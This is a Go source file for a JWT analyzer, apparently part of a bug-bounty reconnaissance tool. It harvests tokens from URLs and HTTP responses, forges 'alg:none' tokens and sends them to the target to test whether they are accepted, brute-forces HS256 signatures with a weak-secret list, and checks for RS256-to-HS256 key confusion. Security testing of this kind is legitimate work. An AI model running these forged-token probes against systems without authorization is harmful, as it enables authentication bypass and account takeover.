package tools

import (
	"github.com/Developer-Army/BBPTS/internal/domain/recon"
	"context"
	"crypto/hmac"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"time"

	"golang.org/x/time/rate"
)

type JWTAnalyzerTool struct{}

func (t *JWTAnalyzerTool) Name() string {
	return "jwt_analyzer"
}

var jwtRegex = regexp.MustCompile(`ey[a-zA-Z0-9_-]{10,}\.ey[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}`)

func (t *JWTAnalyzerTool) Run(ctx context.Context, scanCtx *recon.ScanContext, targets []string, threads int) ([]recon.Event, error) {
	if len(targets) == 0 {
		return nil, nil
	}

	rateLimit := ToolRateLimitFromCtx(ctx, t.Name())
	if rateLimit <= 0 {
		rateLimit = 50
	}
	pool := NewWorkerPool(threads, rate.Limit(rateLimit))

	return pool.Process(ctx, targets, func(ctx context.Context, target string) ([]recon.Event, error) {
		target = strings.TrimSpace(target)
		if target == "" {
			return nil, nil
		}

		var tokens []string

		// 1. Scan URL strings for embedded JWTs (query params, fragments)
		if m := jwtRegex.FindAllString(target, -1); len(m) > 0 {
			tokens = append(tokens, m...)
		}

		// 2. Fetch the HTTP response and scan headers + body for JWTs
		if strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") {
			fetchedTokens := t.fetchAndScan(ctx, target)
			tokens = append(tokens, fetchedTokens...)
		}

		// 3. Check context-provided headers (Authorization, Set-Cookie, etc.)
		headers := scanCtx.Headers
		for _, v := range headers {
			if m := jwtRegex.FindString(v); m != "" {
				tokens = append(tokens, m)
			}
		}

		if len(tokens) == 0 {
			return nil, nil
		}

		// Deduplicate tokens
		seen := make(map[string]bool)
		var uniqueTokens []string
		for _, tok := range tokens {
			if !seen[tok] {
				seen[tok] = true
				uniqueTokens = append(uniqueTokens, tok)
			}
		}

		var events []recon.Event
		var mu sync.Mutex

		for _, token := range uniqueTokens {
			parts := strings.Split(token, ".")
			if len(parts) != 3 {
				continue
			}

			headerDec, err := base64.RawURLEncoding.DecodeString(parts[0])
			if err != nil {
				continue
			}

			payloadDec, err := base64.RawURLEncoding.DecodeString(parts[1])
			if err != nil {
				continue
			}

			var headerJSON map[string]interface{}
			if err := json.Unmarshal(headerDec, &headerJSON); err != nil {
				continue
			}

			var payloadJSON map[string]interface{}
			if err := json.Unmarshal(payloadDec, &payloadJSON); err != nil {
				continue
			}

			alg, _ := headerJSON["alg"].(string)

			// 1. Test None Algorithm and verify server-side acceptance.
			forgedNoneToken := t.forgeNoneToken(parts[1])
			if accepted, evidence := t.verifyForgedTokenAccepted(ctx, target, token, forgedNoneToken); accepted || (strings.ToLower(alg) == "none" && accepted) {
				mu.Lock()
				events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
					"vuln_name":   "JWT None Algorithm Allowed",
					"severity":    "critical",
					"token":       token,
					"forged":      forgedNoneToken,
					"evidence":    evidence,
					"description": "JWT signature verification bypassed using an 'alg:none' token accepted by the protected endpoint.",
				}, "critical"))
				mu.Unlock()
				slog.Warn("Found JWT vulnerability: None algorithm", "target", target)
				continue
			}

			// 2. Test Weak HS256 Secrets
			if strings.ToUpper(alg) == "HS256" {
				weakSecrets := []string{"secret", "admin", "123456", "password", "jwt", "key", "root"}
				for _, secret := range weakSecrets {
					if t.verifyHS256(parts[0], parts[1], parts[2], secret) {
						mu.Lock()
						events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
							"vuln_name":   "Weak JWT HMAC Secret Key",
							"severity":    "high",
							"secret":      secret,
							"description": fmt.Sprintf("Weak secret key '%s' found verifying JWT HS256 signature.", secret),
						}, "high"))
						mu.Unlock()
						slog.Warn("Found weak JWT secret key", "target", target, "secret", secret)
						break
					}
				}
			}

			// 3. RS256→HS256 Confusion Attack
			// If algorithm is RS256, test if server accepts HS256 signed with the public key
			if strings.ToUpper(alg) == "RS256" {
				if pubKey, ok := headerJSON["x5c"]; ok {
					if confused, evidence := t.testRS256toHS256Confusion(parts, pubKey); confused {
						mu.Lock()
						events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
							"vuln_name":   "JWT RS256 to HS256 Confusion",
							"severity":    "critical",
							"token":       token,
							"evidence":    evidence,
							"description": "Server accepts HS256 signature using the RSA public key as HMAC secret, allowing signature forgery.",
						}, "critical"))
						mu.Unlock()
						slog.Warn("Found RS256→HS256 confusion vulnerability", "target", target)
					}
				}
			}
		}

		return events, nil
	})
}

// fetchAndScan performs an HTTP GET and scans response headers and body for JWTs.
func (t *JWTAnalyzerTool) fetchAndScan(ctx context.Context, target string) []string {
	client := NewSafeHTTPClient(10 * time.Second)
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return nil
	}
	headers := recon.HeadersFromCtx(ctx)
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	var tokens []string

	// Scan response headers for JWTs (Authorization, Set-Cookie, etc.)
	for _, vals := range resp.Header {
		for _, v := range vals {
			if m := jwtRegex.FindString(v); m != "" {
				tokens = append(tokens, m)
			}
		}
	}

	// Scan response body for JWTs
	body, err := io.ReadAll(io.LimitReader(resp.Body, 2*1024*1024))
	if err != nil {
		return tokens
	}
	if m := jwtRegex.FindAllString(string(body), -1); len(m) > 0 {
		tokens = append(tokens, m...)
	}

	return tokens
}

func (t *JWTAnalyzerTool) forgeNoneToken(payload string) string {
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	return header + "." + payload + "."
}

func (t *JWTAnalyzerTool) verifyForgedTokenAccepted(ctx context.Context, target, originalToken, forgedToken string) (bool, string) {
	if forgedToken == "" || (!strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://")) {
		return false, ""
	}
	unauthStatus := t.requestWithBearer(ctx, target, "")
	originalStatus := t.requestWithBearer(ctx, target, originalToken)
	forgedStatus := t.requestWithBearer(ctx, target, forgedToken)
	forgedOK := forgedStatus >= 200 && forgedStatus < 300
	unauthDenied := unauthStatus == http.StatusUnauthorized || unauthStatus == http.StatusForbidden
	originalOK := originalStatus >= 200 && originalStatus < 300
	if forgedOK && (unauthDenied || originalOK || originalStatus == http.StatusUnauthorized || originalStatus == http.StatusForbidden) {
		return true, fmt.Sprintf("unauth=%d original=%d forged_none=%d", unauthStatus, originalStatus, forgedStatus)
	}
	return false, ""
}

func (t *JWTAnalyzerTool) requestWithBearer(ctx context.Context, target, token string) int {
	client := NewSafeHTTPClient(10 * time.Second)
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if err != nil {
		return 0
	}
	for k, v := range recon.HeadersFromCtx(ctx) {
		if strings.EqualFold(k, "Authorization") {
			continue
		}
		req.Header.Set(k, v)
	}
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1024))
	return resp.StatusCode
}

func (t *JWTAnalyzerTool) verifyHS256(header, payload, signature, secret string) bool {
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(header + "." + payload))
	expected := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	return expected == signature
}

// testRS256toHS256Confusion tests if the server accepts HS256 signed with the RSA public key.
// This is the "algorithm confusion" attack where an attacker switches from RS256 to HS256,
// using the public key (from x5c header) as the HMAC secret.
func (t *JWTAnalyzerTool) testRS256toHS256Confusion(parts []string, x5c interface{}) (bool, string) {
	certChain, ok := x5c.([]interface{})
	if !ok || len(certChain) == 0 {
		return false, ""
	}

	certStr, ok := certChain[0].(string)
	if !ok {
		return false, ""
	}

	// Decode the certificate to extract the public key
	certPEM := "-----BEGIN CERTIFICATE-----\n" + certStr + "\n-----END CERTIFICATE-----"
	block, _ := pem.Decode([]byte(certPEM))
	if block == nil {
		return false, ""
	}

	cert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return false, ""
	}

	pubKey, ok := cert.PublicKey.(*rsa.PublicKey)
	if !ok {
		return false, ""
	}

	// Convert RSA public key to raw bytes for HMAC use
	pubKeyBytes := pubKey.N.Bytes()

	// Sign header.payload with HS256 using the raw public key bytes
	mac := hmac.New(sha256.New, pubKeyBytes)
	mac.Write([]byte(parts[0] + "." + parts[1]))
	newSig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

	// If the new signature matches, the server accepted the confused algorithm
	if newSig == parts[2] {
		return true, "Public key bytes from x5c certificate used as HMAC secret"
	}

	// Also try with PEM-encoded public key
	pubKeyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PUBLIC KEY", Bytes: x509.MarshalPKCS1PublicKey(pubKey)})
	mac2 := hmac.New(sha256.New, pubKeyPEM)
	mac2.Write([]byte(parts[0] + "." + parts[1]))
	newSig2 := base64.RawURLEncoding.EncodeToString(mac2.Sum(nil))

	if newSig2 == parts[2] {
		return true, "PEM-encoded public key used as HMAC secret"
	}

	// Try with modulus as hex string
	modHex := fmt.Sprintf("%x", pubKey.N)
	mac3 := hmac.New(sha256.New, []byte(modHex))
	mac3.Write([]byte(parts[0] + "." + parts[1]))
	newSig3 := base64.RawURLEncoding.EncodeToString(mac3.Sum(nil))

	if newSig3 == parts[2] {
		return true, "Public key modulus hex used as HMAC secret"
	}

	return false, ""
}

var _ recon.Tool = (*JWTAnalyzerTool)(nil)
